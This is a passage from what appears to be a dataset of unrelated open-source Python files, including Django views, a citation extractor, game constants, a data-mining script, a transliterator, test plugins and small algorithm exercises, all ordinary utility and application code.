post(self, request, club_id, *args, **kwargs):\n    club = Club.objects.get(pk=club_id)\n\n    budget_form = self.budget_form_class()\n    budget_form.fields['did'].queryset = Division.objects.filter(cid=club)\n\n    division_form = self.division_form_class\n\n    if 'division' in request.POST:\n      division_form = self.division_form_class(request.POST)\n\n      if division_form.is_valid():\n        division = division_form.save()\n        division.cid = club\n        division.save()\n        messages.add_message(request, messages.SUCCESS, 'You Have Created a New Division!')\n        return HttpResponseRedirect(reverse('suite:budget', args=[club_id]))\n      else:\n        messages.add_message(request, messages.WARNING, 'Cannot Make Division with Same Name')\n        return HttpResponseRedirect(reverse('suite:budget', args=[club_id]))\n\n    elif 'budget' in request.POST:\n      budget_form = self.budget_form_class(request.POST)\n      if budget_form.is_valid():\n        budget = budget_form.save(commit=True)\n        budget.save()\n      else:\n        messages.add_message(request, messages.WARNING, 'Could not create budget.')\n\n    books = self.generate_books(club.division_set.all())\n    total_budget = 0\n    total_expense = 0\n    for book in books:\n      total_budget = total_budget + book['total_budget']\n      total_expense = total_expense + book['total_expense']\n\n    return render(request, self.template_name, { 'books' : books,\n                                                 'club': club,\n                                                 'budget_form' : budget_form,\n                                                 'division_form' : division_form,\n                                                 'total_budget' : total_budget,\n                                                 'total_expense' : total_expense})\n"}
{"text": "\nimport re\nimport os.path\nimport logging\nimport subprocess\n\nimport research_papers.logutils as logutils\n\n\n__author__ = 'robodasha'\n__email__ = 'damirah@live.com'\n\n\nclass ParscitExtractor(object):\n\n    def __init__(self, parscit_dir):\n        \"\"\"\n        :param parscit_dir: directory where ParsCit is installed\n        \"\"\"\n        self._logger = logging.getLogger(__name__)\n        self._parscit_dir = parscit_dir\n        self._command = os.path.join(self._parscit_dir, 'bin/citeExtract.pl')\n\n    def _output_path(self, input_path):\n        \"\"\"\n        Get output path from input path (essentially just replaces the input\n        extension with .xml).\n        :param input_path:\n        :return:\n        \"\"\"\n        return os.path.splitext(input_path)[0] + '.xml'\n\n    def extract_file(self, text_path):\n        \"\"\"\n        Extracts citations from text file. The citations are stored in the same\n        directory in an xml the name of which matches the original text file\n        (e.g. for text file xyz.txt the citations will be stored in xyz.xml).\n        :param text_path: path to the text file to extract citations from\n        :return: None\n        \"\"\"\n        # check if the file exists to avoid unnecessary allocation of resources\n        if not os.path.exists(text_path) or os.path.getsize(text_path) <= 0:\n            msg = 'File {} does not exist or is empty'.format(text_path)\n            self._logger.warn(msg)\n            return\n\n        text_fname = os.path.basename(text_path)\n        self._logger.info('Extracting citations from {}'.format(text_fname))\n        out_path = self._output_path(text_path)\n\n        # skip if already extracted\n        if os.path.exists(out_path):\n            self._logger.debug('Citations for file {} already exist'\n                               .format(text_fname))\n        else:\n            self._logger.info('Extracting citations')\n            full_command = ['perl', self._command, '-m', 'extract_all',\n                            text_path, out_path]\n            subprocess.call(full_command)\n            # if the output file doesn't exist at this point, create an empty\n            # file instead, so that next time the unsuccessful file is skipped\n            if not os.path.exists(out_path):\n                with open(out_path, 'w'):\n                    pass\n        return\n\n    def extract_directory(self, directory):\n        \"\"\"\n        Extracts citations from all text files found in a directory. The\n        citations for each text file are stored in the same directory in an xml\n        file the name of which matches the name of the text file (e.g. for text\n        xyz.txt the citations will be stored in xyz.xml).\n        :param directory: the directory with text files\n        :return: None\n        \"\"\"\n        self._logger.info('Extracting citations from text files in {}'\n                          .format(directory))\n        files = [f for f in os.listdir(directory) if re.match(r'[0-9]+.txt', f)]\n\n        # for logging purposes\n        processed = 0\n        total = len(files)\n        how_often = logutils.how_often(total)\n        self._logger.info('Found {} files to be processed'.format(total))\n\n        for text in files:\n            self._logger.debug('Processing file {}'.format(text))\n\n            # run extraction and save the result\n            self._logger.debug('Extracting citations from file {}'\n                               .format(text))\n            self.extract_file(os.path.join(directory, text))\n\n            # log progress\n            processed += 1\n            if processed % how_often == 0:\n                self._logger.debug(logutils.get_progress(processed, total))\n        return\n"}
{"text": "\ufeffimport sys\nimport xml.etree.ElementTree as ElementTree\n\ndef log(msg):\n    sys.stderr.write(msg + '\\n')\n\nclass Project:\n    Filename = 'Helpers.csproj'\n    Schema = '{http://schemas.microsoft.com/developer/msbuild/2003}'\n    RootTag = Schema + 'Project'\n    Property = Schema + 'PropertyGroup'\n    Release = Schema + 'ReleaseVersion'\n    Package = Schema + 'Description'\n\nclass Version:\n    In = 'Version.cs.in'\n    Out = 'Version.cs'\n\ndef main(*args):\n    project_tree = ElementTree.parse(Project.Filename)\n    project = project_tree.getroot()\n\n    version = None\n    package = None\n\n    for release in project.iter(Project.Release):\n        version = release.text\n        log('Release: {}'.format(version))\n        break\n    else:\n        log('Error: version not found!')\n        return -1\n\n    for name in project.iter(Project.Package):\n        package = name.text\n        log('Package: {}'.format(package))\n        break\n    else:\n        log('Error: package not found!')\n        return -1\n\n    with open(Version.In) as input:\n        with open(Version.Out, 'w') as output:\n            content = input.read()\n            content = content.replace('{VersionName}', version)\n            content = content.replace('{PackageName}', package)\n            output.write(content)\n            log('Writed: {} -> {}.{} -> {}'.format(Version.In, package, version, Version.Out))\n\nif __name__ == '__main__':\n    sys.exit(main(*sys.argv))\n"}
{"text": "\ufeff#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\"\"\"\n    This file is part of XBMC Mega Pack Addon.\n\n    Copyright (C) 2014 Wolverine (xbmcmegapack@gmail.com)\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License along\n    with this program.  If not, see http://www.gnu.org/licenses/gpl-3.0.html\n\"\"\"\n\n\nclass Countries_Cambodia():\n    '''Class that manages this specific menu context.'''\n\n    def open(self, plugin, menu):\n        menu.add_xplugins(plugin.get_xplugins(dictionaries=[\"Channels\",\n            \"Events\", \"Live\", \"Movies\", \"Sports\", \"TVShows\"],\n            countries=[\"Cambodia\"]))"}
{"text": "\n\nclass Student:\n\t\"\"\"This is a very simple Student class\"\"\"\n\tcourse_marks = {}\n\tname = \"\"\n\tfamily = \"\"\n\t\n\tdef __init__(self, name, family):\n\t\tself.name = name\n\t\tself.family = family\n\n\tdef addCourseMark(self, course, mark):\n\t\t\"\"\"Add the course to the course dictionary,\n\t\tthis will overide the old mark if one exists.\"\"\"\n\t\tself.course_marks[course] = mark\n\n\tdef average(self):\n\t\t\"\"\"Calculates the average grade percentage based on\n\t\tall courses added to the studetn with formula: \n\t\tsum(courses)/count(courses)\n\t\t\n\t\t\t-Returns: Integer(0 if no courses)\n\t\t\"\"\"\n\t\tmark_sum = 0\n\t\tcourses_total = 0\n\t\tfor course, mark in self.course_marks.items():\n\t\t\tmark_sum += mark\n\t\t\tcourses_total += 1\n\t\tif courses_total != 0:\n\t\t\treturn mark_sum/courses_total\n\t\telse:\n\t\t\treturn 0\n\n#Start\nif __name__ == \"__main__\":\n\t\n\t#Make a new student, John Doe\t\n\tstudent = Student(\"John\", \"Doe\")\n\t\n\t#Add several course grades\n\tstudent.addCourseMark(\"CMPUT 101\", 25)\n\tstudent.addCourseMark(\"SCIENCE 101\", 50)\n\tstudent.addCourseMark(\"ART 101\", 75)\n\tstudent.addCourseMark(\"MUSIC 101\", 100)\n\tstudent.addCourseMark(\"DANCE 101\", 50)\n\n\t#Print the average, the average should be 60%\n\tprint(\"{0}'s average is: {1}%\".format(student.name, student.average()))\n\t\n"}
{"text": "#################### config.py ###################\n##                                              ##\n## This file set differents constants           ##\n##                                              ##\n## Ce fichier initialise diff\u00e9rentes constantes ##\n##                                              ##\n##################################################\n\nimport os\nfrom pygame.locals import *\n\nWINDOW_ICON_PATH = os.path.join(\"Pictures\", \"Icon.png\")\nWINDOW_CAPTION = \"Bros. Bomb Squad\"\nWINDOW_FLAGS = HWSURFACE|DOUBLEBUF\nWINDOW_X_RES = 304\nWINDOW_Y_RES = 208\nWINDOW_RES = (WINDOW_X_RES, WINDOW_Y_RES)\nSPRITE_SIZE = 16\nX_OFFSET = 0\nY_OFFSET = 4\nBOMB_TIMEOUT = 2.\nEXPLOSION_TIMEOUT = 1.5\n\n# Item types\nNOTHING =0\nEXPLOSION = 1\nBONUS = 2\nBOMB = 3\nBREAKABLE = 4\nWALL = 5\n\n# Directions\nLEFT = (-1, 0)\nRIGHT = (1, 0)\nUP = (0, -1)\nDOWN = (0, 1)\nDIRECTIONS = [LEFT, RIGHT, UP, DOWN]\n\n# Bonus types\nBOMB_BONUS = 0\nPOWER_BONUS = 1\nSPEED_BONUS = 2\n\n# Explosion types\nCENTER = 0\nTUBEUP = 1\nENDUP = 2\nTUBELEFT = 3\nENDLEFT = 4\nTUBEDOWN = 5\nENDDOWN = 6\nTUBERIGHT = 7\nENDRIGHT = 8\n\n# Player keys\nSPEED_INIT = 1.\nBOMBSMAX_INIT = 1\nPOWER_INIT = 2\nKEYS_1 = [K_UP, K_DOWN, K_LEFT, K_RIGHT, K_KP_ENTER]\nKEYS_2 = [K_w, K_s, K_a, K_d, K_SPACE]\nKEYS = [KEYS_1, KEYS_2]\n\n"}
{"text": "#!/usr/bin/env python\n# W.J. van der Laan, 2011\n# Make spinning .mng animation from a .png\n# Requires imagemagick 6.7+\nfrom __future__ import division\nfrom os import path\nfrom PIL import Image\nfrom subprocess import Popen\n\nDTC='img/reload_scaled.png'\nDST='../../src/qt/res/movies/update_spinner.mng'\nTMPDIR='/tmp'\nTMPNAME='tmp-%03i.png'\nNUMFRAMES=35\nFRAMERATE=10.0\nCONVERT='convert'\nCLOCKWISE=True\nDSIZE=(16,16)\n\nim_src = Image.open(DTC)\n\nif CLOCKWISE:\n    im_src = im_src.transpose(Image.FLIP_LEFT_RIGHT)\n\ndef frame_to_filename(frame):\n    return path.join(TMPDIR, TMPNAME % frame)\n\nframe_files = []\nfor frame in xrange(NUMFRAMES):\n    rotation = (frame + 0.5) / NUMFRAMES * 360.0\n    if CLOCKWISE:\n        rotation = -rotation\n    im_new = im_src.rotate(rotation, Image.BICUBIC)\n    im_new.thumbnail(DSIZE, Image.ANTIALIAS)\n    outfile = frame_to_filename(frame)\n    im_new.save(outfile, 'png')\n    frame_files.append(outfile)\n\np = Popen([CONVERT, \"-delay\", str(FRAMERATE), \"-dispose\", \"2\"] + frame_files + [DST])\np.communicate()\n\n\n\n"}
{"text": "# -*-coding:Utf-8 -*\n\n# Copyright (c) 2015 LE GOFF Vincent\n# All rights reserved.\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are met:\n#\n# * Redistributions of source code must retain the above copyright notice, this\n#   list of conditions and the following disclaimer.\n# * Redistributions in binary form must reproduce the above copyright notice,\n#   this list of conditions and the following disclaimer in the documentation\n#   and/or other materials provided with the distribution.\n# * Neither the name of the copyright holder nor the names of its contributors\n#   may be used to endorse or promote products derived from this software\n#   without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT\n# OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n\n\n\"\"\"Fichier contenant la classe Rang, d\u00e9taill\u00e9e plus bas.\"\"\"\n\nfrom abstraits.obase import BaseObj\nfrom secondaires.crafting.exception import ExceptionCrafting\nfrom secondaires.crafting.recette import Recette\n\nclass Rang(BaseObj):\n\n    \"\"\"Classe repr\u00e9sentant un rang de guilde.\"\"\"\n\n    def __init__(self, guilde, cle):\n        \"\"\"Constructeur de la fiche.\"\"\"\n        BaseObj.__init__(self)\n        self.guilde = guilde\n        self.cle = cle\n        self.nom = \"rang inconnu\"\n        self.points_guilde = 10\n        self.recettes = []\n        self._construire()\n\n    def __getnewargs__(self):\n        return (None, \"\")\n\n    @property\n    def total_points_guilde(self):\n        \"\"\"Retourne les points de guilde consomm\u00e9s pour arriver \u00e0 ce rang.\n\n        Si le rang a des pr\u00e9d\u00e9cesseurs, retourne la somme des\n        points de guilde n\u00e9cessit\u00e9s pour atteindre ce rang. Par\n        exemple, si un membre est au rang 2, il faut additionner\n        les points de guilde du rang 1 et du rang 2.\n\n        \"\"\"\n        # Cherche \u00e0 trouver les rangs pr\u00e9d\u00e9cesseurs\n        guilde = self.guilde\n        try:\n            indice = guilde.rangs.index(self)\n        except ValueError:\n            raise RangIntrouvable(\"le rang {} ne peut \u00eatre trouv\u00e9 \" \\\n                    \"dans la guilde {}\".format(self.cle, guilde.cle))\n\n        precedents = guilde.rangs[:indice]\n        return sum(p.points_guilde for p in precedents) + self.points_guilde\n\n    @property\n    def membres(self):\n        \"\"\"Retourne la liste des membres (personnages) \u00e0 ce rang.\"\"\"\n        progressions = self.guilde.membres.values()\n        membres = []\n\n        for progression in progressions:\n            if progression.rang is self:\n                membres.append(progression.membre)\n\n        return membres\n\n    @property\n    def nom_complet(self):\n        \"\"\"Retourne le nom complet du rang.\"\"\"\n        membres = self.membres\n        ps = \"s\" if self.points_guilde > 1 else \"\"\n        ms = \"s\" if len(membres) > 1 else \"\"\n\n        msg = \"{}, nom : {}, {} point{ps} de guilde ({} accumul\u00e9s), \" \\\n                \"{} membre{ms}\".format(self.cle, self.nom, self.points_guilde,\n                self.total_points_guilde, len(membres), ps=ps, ms=ms)\n\n        return msg\n\n    @property\n    def rangs_parents(self):\n        \"\"\"Retourne les rangs parents, incluant self.\"\"\"\n        guilde = self.guilde\n        try:\n            indice = guilde.rangs.index(self)\n        except ValueError:\n            raise RangIntrouvable(\"le rang {} ne peut \u00eatre trouv\u00e9 \" \\\n                    \"dans la guilde {}\".format(self.cle, guilde.cle))\n\n        return guilde.rangs[:indice + 1]\n\n    def get_recette(self, cle, exception=True):\n        \"\"\"R\u00e9cup\u00e8re la recette correspondant \u00e0 la cl\u00e9.\n\n        La cl\u00e9 est celle du r\u00e9sultat.\n\n        \"\"\"\n        cle = cle.lower()\n        for recette in self.recettes:\n            if recette.resultat == cle:\n                return recette\n\n        if exception:\n            raise ValueError(\"Recette {} inconnue\".format(repr(cle)))\n\n    def ajouter_recette(self, resultat):\n        \"\"\"Ajoute une recette.\n\n        Le r\u00e9sultat doit \u00eatre la cl\u00e9 du prototype de r\u00e9sultat.\n\n        \"\"\"\n        if self.get_recette(resultat, False):\n            raise ValueError(\"La recette {} existe d\u00e9j\u00e0\".format(\n                    repr(resultat)))\n\n        recette = Recette(self)\n        recette.resultat = resultat\n        self.recettes.append(recette)\n        return recette\n\n    def supprimer_recette(self, cle):\n        \"\"\"Retire la recette sp\u00e9cifi\u00e9e.\"\"\"\n        cle = cle.lower()\n        for recette in list(self.recettes):\n            if recette.resultat == cle:\n                self.recettes.remove(recette)\n                recette.detruire()\n                return\n\n        raise ValueError(\"Recette {} introuvable\".format(repr(cle)))\n\n\n\nclass RangIntrouvable(ExceptionCrafting):\n\n    \"\"\"Exception lev\u00e9e si le rang de la guilde est introuvable.\"\"\"\n\n    pass\n"}
{"text": "#-------------------------------------------------------------------------------\n# Name:        Apriori.py\n# Purpose:     Mining Frequent Itemsets\n# Author:      Vasileios Kagklis\n# Created:     10/02/2014\n# Copyright:   (c) Vasileios Kagklis\n#-------------------------------------------------------------------------------\nfrom __future__ import division, print_function\nimport os\nfrom time import clock\nfrom fim import apriori\nfrom myiolib import readDataset\n\n\ndef printResults(fname, sup, Time, F, out_fname):\n    result_file=open(out_fname,'w')\n    visible_file=open('Apriori_visible.txt','w')\n    print('Apriori Execution',file=visible_file)\n    print('=================',file=visible_file)\n    print('Data Set from File:',fname,file=visible_file)\n    print('Support= ',sup,file=visible_file)\n    print('Frequent Itemsets ==> Support:',file=visible_file)\n    print('',file=visible_file)\n    print('Results:','\\n',file=visible_file)\n    data_line=''\n    itemset_and_sup=''\n    Vis_itemset_and_sup=''\n    for itemset, support in F.items():\n        ItemSet=list(itemset)\n        ItemSet.sort()\n        for item in ItemSet:\n            data_line=data_line+item+' '\n        itemset_and_sup=data_line+(str(support))\n        Vis_itemset_and_sup=data_line+'==>'+(str(round(support,5)))\n        print(itemset_and_sup,file=result_file)\n        print(Vis_itemset_and_sup,file=visible_file)\n        data_line=''\n        itemset_and_sup=''\n        Vis_itemset_and_sup=''\n    print('Execution time= ',Time,file=visible_file)\n    visible_file.close()\n    result_file.close()\n                     \n    \ndef convert2dic(F, N):\n    freq = {}\n    for itemset in F:\n        freq[frozenset(itemset[0])] = float(itemset[1][0]/N)\n    return freq\n\ndef convert2frozen_m(f):\n    result = []\n    for itemset in f:\n        result.append(frozenset(itemset[0]))\n    return(result)\n\ndef Apriori_main(data_fname, minSupport, out_fname='Apriori_results.txt'):\n    lines,tid = readDataset(data_fname)\n    t1=clock()\n    temp_freq = apriori(tid, target='s', supp=float(minSupport*100), conf=100)\n    CPU_time=clock()-t1    \n    freq_items = convert2dic(temp_freq,lines)\n    printResults(data_fname,minSupport,CPU_time,freq_items,out_fname)\n    return(freq_items,CPU_time)\n"}
{"text": "\"\"\"\nWSGI config for lacuna project.\n\nThis module contains the WSGI application used by Django's development server\nand any production WSGI deployments. It should expose a module-level variable\nnamed ``application``. Django's ``runserver`` and ``runfcgi`` commands discover\nthis application via the ``WSGI_APPLICATION`` setting.\n\nUsually you will have the standard Django WSGI application here, but it also\nmight make sense to replace the whole Django WSGI application with a custom one\nthat later delegates to the Django one. For example, you could introduce WSGI\nmiddleware here, or combine a Django application with an application of another\nframework.\n\n\"\"\"\nimport os\n\nfrom django.core.wsgi import get_wsgi_application\n\nfrom raven.contrib.django.raven_compat.middleware.wsgi import Sentry\n\n# We defer to a DJANGO_SETTINGS_MODULE already in the environment. This breaks\n# if running multiple sites in the same mod_wsgi process. To fix this, use\n# mod_wsgi daemon mode with each site in its own daemon process, or use\n# os.environ[\"DJANGO_SETTINGS_MODULE\"] = \"config.settings.production\"\nos.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"config.settings.production\")\n\n# This application object is used by any WSGI server configured to use this\n# file. This includes Django's development server, if the WSGI_APPLICATION\n# setting points here.\napplication = get_wsgi_application()\n\n\napplication = Sentry(application)\n\n# Apply WSGI middleware here.\n# from helloworld.wsgi import HelloWorldApplication\n# application = HelloWorldApplication(application)\n"}
{"text": "__author__ = 'Darktel'\n\n\ndef translit(Mystring):\n    \"\"\"\n    String (Rus) -> String (Eng)\n\n\n    \"\"\"\n\n    RusString = '\u0430,\u0431,\u0432,\u0433,\u0434,\u0435,\u0451,\u0436,\u0437,\u0438,\u0439,\u043a,\u043b,\u043c,\u043d,\u043e,\u043f,\u0440,\u0441,\u0442,\u0443,\u0444,\u0445,\u0446,\u0447,\u0448,\u0449,\u044b,\u044c,\u044a,\u044d,\u044e,\u044f,*, ,'\n    EngString = \"a,b,v,g,d,e,yo,zh,z,i,j,k,l,m,n,o,p,r,s,t,u,f,h,c,ch,sh,xh,y,',`,q,ju,ya,*,-,\"\n\n    RusChar = RusString.split(',')\n    EngChar = EngString.split(',')\n\n    translitString = ''\n\n    for char in Mystring:\n        try:\n            if char.isupper():\n                charlow = char.lower()\n                index = RusChar.index(charlow)\n                translitString += EngChar[index].upper()\n            else:\n                index = RusChar.index(char)\n                translitString += EngChar[index]\n        except:\n            translitString += char\n\n    return translitString\n\n\n\ntestString = translit('''\u0434\u043e\u0441\u043a\u0430 \u043e\u0431\u0440\u0435\u0437\u043d\u0430\u044f 50\u0445150\u04456000\n\u0434\u043e\u0441\u043a\u0430 \u043e\u0431\u0440\u0435\u0437\u043d\u0430\u044f \u043a\u0440\u0430\u0441\u043d\u043e\u0434\u0430\u0440 \u0446\u0435\u043d\u0430\n\u0446\u0435\u043d\u0430 \u043a\u0443\u0431\u0430 \u0434\u043e\u0441\u043a\u0438 \u043e\u0431\u0440\u0435\u0437\u043d\u043e\u0439\n\u043a\u0443\u0431 \u043e\u0431\u0440\u0435\u0437\u043d\u043e\u0439 \u0434\u043e\u0441\u043a\u0438\n\u043a\u0443\u043f\u0438\u0442\u044c \u0434\u043e\u0441\u043a\u0443 \u043e\u0431\u0440\u0435\u0437\u043d\u0443\u044e\n''')\nprint(testString)\n"}
{"text": "# plugin/noseplugin.py\n# Copyright (C) 2005-2014 the SQLAlchemy authors and contributors <see AUTHORS file>\n#\n# This module is part of SQLAlchemy and is released under\n# the MIT License: http://www.opensource.org/licenses/mit-license.php\n\n\"\"\"Enhance nose with extra options and behaviors for running SQLAlchemy tests.\n\nMust be run via ./sqla_nose.py so that it is imported in the expected\nway (e.g. as a package-less import).\n\n\"\"\"\n\nimport os\nimport sys\n\nfrom nose.plugins import Plugin\nfixtures = None\n\n# no package imports yet!  this prevents us from tripping coverage\n# too soon.\npath = os.path.join(os.path.dirname(__file__), \"plugin_base.py\")\nif sys.version_info >= (3,3):\n    from importlib import machinery\n    plugin_base = machinery.SourceFileLoader(\"plugin_base\", path).load_module()\nelse:\n    import imp\n    plugin_base = imp.load_source(\"plugin_base\", path)\n\n\nclass NoseSQLAlchemy(Plugin):\n    enabled = True\n\n    name = 'sqla_testing'\n    score = 100\n\n    def options(self, parser, env=os.environ):\n        Plugin.options(self, parser, env)\n        opt = parser.add_option\n\n        def make_option(name, **kw):\n            callback_ = kw.pop(\"callback\", None)\n            if callback_:\n                def wrap_(option, opt_str, value, parser):\n                    callback_(opt_str, value, parser)\n                kw[\"callback\"] = wrap_\n            opt(name, **kw)\n\n        plugin_base.setup_options(make_option)\n        plugin_base.read_config()\n\n    def configure(self, options, conf):\n        super(NoseSQLAlchemy, self).configure(options, conf)\n        plugin_base.pre_begin(options)\n\n        plugin_base.set_coverage_flag(options.enable_plugin_coverage)\n\n        global fixtures\n        from sqlalchemy.testing import fixtures\n\n    def begin(self):\n        plugin_base.post_begin()\n\n    def describeTest(self, test):\n        return \"\"\n\n    def wantFunction(self, fn):\n        if fn.__module__ is None:\n            return False\n        if fn.__module__.startswith('sqlalchemy.testing'):\n            return False\n\n    def wantClass(self, cls):\n        return plugin_base.want_class(cls)\n\n    def beforeTest(self, test):\n        plugin_base.before_test(test,\n                        test.test.cls.__module__,\n                        test.test.cls, test.test.method.__name__)\n\n    def afterTest(self, test):\n        plugin_base.after_test(test)\n\n    def startContext(self, ctx):\n        if not isinstance(ctx, type) \\\n            or not issubclass(ctx, fixtures.TestBase):\n            return\n        plugin_base.start_test_class(ctx)\n\n    def stopContext(self, ctx):\n        if not isinstance(ctx, type) \\\n            or not issubclass(ctx, fixtures.TestBase):\n            return\n        plugin_base.stop_test_class(ctx)\n"}
{"text": "import logging\r\n\r\nfrom abc import ABCMeta, abstractmethod\r\n\r\nfrom c7n.utils import local_session\r\nfrom c7n_azure.session import Session\r\n\r\n\r\nclass DeploymentUnit(metaclass=ABCMeta):\r\n    log = logging.getLogger('custodian.azure.deployment_unit.DeploymentUnit')\r\n\r\n    def __init__(self, client):\r\n        self.type = \"\"\r\n        self.session = local_session(Session)\r\n        self.client = self.session.client(client)\r\n\r\n    def get(self, params):\r\n        result = self._get(params)\r\n        if result:\r\n            self.log.info('Found %s \"%s\".' % (self.type, params['name']))\r\n        else:\r\n            self.log.info('%s \"%s\" not found.' % (self.type, params['name']))\r\n        return result\r\n\r\n    def check_exists(self):\r\n        return self.get() is not None\r\n\r\n    def provision(self, params):\r\n        self.log.info('Creating %s \"%s\"' % (self.type, params['name']))\r\n        result = self._provision(params)\r\n        if result:\r\n            self.log.info('%s \"%s\" successfully created' % (self.type, params['name']))\r\n        else:\r\n            self.log.info('Failed to create %s \"%s\"' % (self.type, params['name']))\r\n        return result\r\n\r\n    def provision_if_not_exists(self, params):\r\n        result = self.get(params)\r\n        if result is None:\r\n            if 'id' in params.keys():\r\n                raise Exception('%s with %s id is not found' % (self.type, params['id']))\r\n            result = self.provision(params)\r\n        return result\r\n\r\n    @abstractmethod\r\n    def _get(self, params):\r\n        raise NotImplementedError()\r\n\r\n    @abstractmethod\r\n    def _provision(self, params):\r\n        raise NotImplementedError()\r\n"}
{"text": "# coding:utf-8\nimport sys, os\nimport os.path\nsys.path.append(os.path.dirname(sys.path[0]))\n\nfrom settings.config import config\nfrom peewee import Model, MySQLDatabase\n\nmysqldb = MySQLDatabase('',\n                        user=config.BACKEND_MYSQL['user'],\n                        password=config.BACKEND_MYSQL['password'],\n                        host=config.BACKEND_MYSQL['host'],\n                        port=config.BACKEND_MYSQL['port'])\n\n\nfrom db.mysql_model.blog import BlogPostCategory, BlogPostLabel, BlogPost\nmd_path = './docs/articles'\n\n\ndef check_md_format(file_path):\n    fd = open(file_path)\n    md_info = {}\n    while True:\n        line = fd.readline().strip()\n        if len(line) == 0:\n            break\n        try:\n            i = line.index(':')\n            k = line[:i]\n            v = line[i+1:]\n        except:\n            fd.close()\n            return None\n        md_info[k.strip().lower()] = v.strip()\n    # \u6821\u9a8c\u5b57\u6bb5\u662f\u5426\u5b58\u5728\n    # Necessary Args: title, tags\n    # Optional Args: date, category, auth, slug\n    keys = md_info.keys()\n    if 'title' in keys and 'tags' in keys and 'slug' in keys:\n        md_info['content'] = fd.read(-1)\n        fd.close()\n        return md_info\n    else:\n        fd.close()\n        return None\n\n\ndef convert_md_2_post(md_info):\n    category = md_info.get('category')\n    if not category:\n        category = 'UnClassified'\n    cate = BlogPostCategory.get_by_name(category)\n    post = BlogPost.create(title=md_info['title'],\n                           category=cate,\n                           slug=md_info['slug'],\n                           content=md_info['content'])\n\n    BlogPostLabel.add_post_label(md_info['tags'], post)\n\n\ndef get_files(root_path):\n    files = os.listdir(root_path)\n    print(files)\n    for file_name in files:\n        _, suffix = os.path.splitext(file_name)\n        if suffix == '.md':\n            md_file_path = os.path.join(root_path, file_name)\n            md_info = check_md_format(md_file_path)\n            if md_info:\n                print(md_info['title'])\n                convert_md_2_post(md_info)\n\nif __name__ == '__main__':\n    mysqldb.create_tables([BlogPostLabel, BlogPost, BlogPostCategory], safe=True)\n    t = BlogPostLabel.delete()\n    t.execute()\n    t = BlogPost.delete()\n    t.execute()\n    t = BlogPostCategory.delete()\n    t.execute()\n\n    get_files(md_path)\n"}
{"text": "# Given a Binary Search Tree and a target number, return true if there exist two elements in the BST such that their sum is equal to the given target.\n\n# Example 1:\n# Input: \n#     5\n#    / \\\n#   3   6\n#  / \\   \\\n# 2   4   7\n\n# Target = 9\n\n# Output: True\n# Example 2:\n# Input: \n#     5\n#    / \\\n#   3   6\n#  / \\   \\\n# 2   4   7\n\n# Target = 28\n\n# Output: False\n\n# Definition for a binary tree node.\n# class TreeNode(object):\n#     def __init__(self, x):\n#         self.val = x\n#         self.left = None\n#         self.right = None\n# Simple BFS levle-order \nclass Solution(object):\n    def findTarget(self, root, k):\n        \"\"\"\n        :type root: TreeNode\n        :type k: int\n        :rtype: bool\n        \"\"\"\n        if not root:\n            return False\n        queue = [root]\n        s = set()\n        while queue:\n            node = queue.pop(0)\n            # two sum thought\n            if k - node.val in s:\n                return True\n            s.add(node.val)\n            if node.left:\n                queue.append(node.left)\n            if node.right:\n                queue.append(node.right)\n        return False\n        "}
{"text": "#!/usr/bin/env python\n# \n# Copyright (c) 2011, Willow Garage, Inc.\n# All rights reserved.\n# \n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are met:\n#     * Redistributions of source code must retain the above copyright\n#       notice, this list of conditions and the following disclaimer.\n#     * Redistributions in binary form must reproduce the above copyright\n#       notice, this list of conditions and the following disclaimer in the\n#       documentation and/or other materials provided with the distribution.\n#     * Neither the name of the Willow Garage, Inc. nor the names of its\n#       contributors may be used to endorse or promote products derived from\n#       this software without specific prior written permission.\n# \n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n# \nimport ecto\nimport ecto.ecto_test as ecto_test\n\ndef test_tendrils():\n    t = ecto.Tendrils()\n    t.declare(\"Hello\",\"doc 